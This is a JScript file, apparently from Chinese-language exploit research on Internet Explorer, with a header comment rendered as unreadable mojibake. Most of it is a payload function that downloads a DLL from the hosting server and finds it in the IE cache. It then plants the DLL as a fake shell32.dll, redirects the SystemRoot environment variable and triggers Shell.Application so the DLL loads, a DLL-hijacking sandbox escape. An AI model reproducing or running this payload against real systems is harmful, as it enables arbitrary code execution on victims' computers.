/**
	���©������˼·�� TK PPT �еĴ��벿�֣�δ��ʵ�ʲ��ԣ�����Դ�������
	�õ���HTML5 ���¼����һЩ API������˵�� WebOS ���棬©�����õ��׸�����ģ�͡�
	���߲ο���ֵ��

	ָ�����á�
		1.  IE ����©���ӵ����Ķ����Ʋ��棬תΪ�˽ű����棬����ά�ȵ������������ȶ��ԵĽ�һ��������
		2.  IE ©���Ѿ�������һ����Ĺ�������ת��Ϊһ��ȫ��λ�����幥����Ҫ�������������ʽ��
					������Ҫ�˽�IE �� HTML5 �Լ� CSS ��֧�ַ�ʽ���Լ�ʵ�ַ�ʽ���л��ᡣ
		3.  ����һ��ѧϰ��ָ�����ã������Զ�����©������������� C �� ��� ������ɣ�
					����һ�׶εĹ���˫������Ҫ���ռ������ȫ��λ��������Щ���������������ڣ�
						HTML5 + CSS3
						javascript 
						C + ���
						WebOS
*/
function payload2()
{
    var oF = new ActiveXObject("Scripting.FileSystemObject");
    var oW = new ActiveXObject("WScript.Shell");
    // find a file based on name in specific directory recursively
    // return full path of first matching file
    var fsearch = function(dir, fname)
    {  //// �ݹ����������������ѳ�ָ�� dir Ŀ¼�£�WebOS�ɿص��ļ�ϵͳ�ڣ��Ƿ���� fname �ļ���
        var FileEnum = new Enumerator(oF.getFolder(dir).SubFolders);
        for (; !FileEnum.atEnd(); FileEnum.moveNext())
        {
            var ret = fsearch(FileEnum.item(), fname);
            if(ret) { return ret; }
        }
        var FileEnum2 = new Enumerator(oF.getFolder(dir).Files);
        for (; !FileEnum2.atEnd(); FileEnum2.moveNext())
        {
            var itm = FileEnum2.item().name;
            if (itm.indexOf(fname) != - 1)
            {
                return FileEnum2.item();
            }
        }
    }

    //////  ��װһЩ������õ��Ĺؼ�·�� ��
    var desktop = oW.SpecialFolders("Desktop");
    var fakesys = desktop + "\\System32";
    var iedir = oW.Environment("Process").Item("LOCALAPPDATA") + "\\Microsoft\\Windows\\Temporary Internet Files";
    if( ! oF.FolderExists(fakesys) )
    {
	    /// ��Ŀ¼������ʱ��Ӧ������һ����
        oF.CreateFolder( fakesys );
    }
    /////    �ӷ�������ȡһ�� dll �ļ�����ʵ���� ��Ҫֲ��ĺ��ţ�������
    var rpath = location.href.split("/").slice(0,-1).join("/") + "/AVeryOddFileName.dll";
    xPost = new ActiveXObject("Microsoft.XMLHTTP");
    xPost.Open("GET", rpath, false);    // false to sync mode
    xPost.Send();
    var dll = fsearch(iedir+"\\Low\\Content.IE5", "AVeryOddFileName");
    if ( dll )
    {
	    /////  dll �������سɹ�ʱ��ִ�иô����
        oF.CopyFile( dll, fakesys+"\\shell32.dll" );
        /////  �� dll ������Ϊ shell32.dll
        var vhomedir = oW.Environment("Process").Item("USERPROFILE").split(":").join("");
        /////  ��װ�µ� ����Ŀ¼·��
        oW.Environment("Process").Item("SystemRoot") = iedir + "\\Virtualized\\" + vhomedir + "\\Desktop";
        /////  ���价�� Ŀ¼·��
        var oS = new ActiveXObject("Shell.Application");    // trigger to load shell32.dll
        /////  ͨ������ Shell ������ shell32.dll ����ļ����Լ��أ��� shell32.dll ��ʱ�����Ѿ�ֲ��ĺ����ļ�������
        return true;
    }
    return false;
}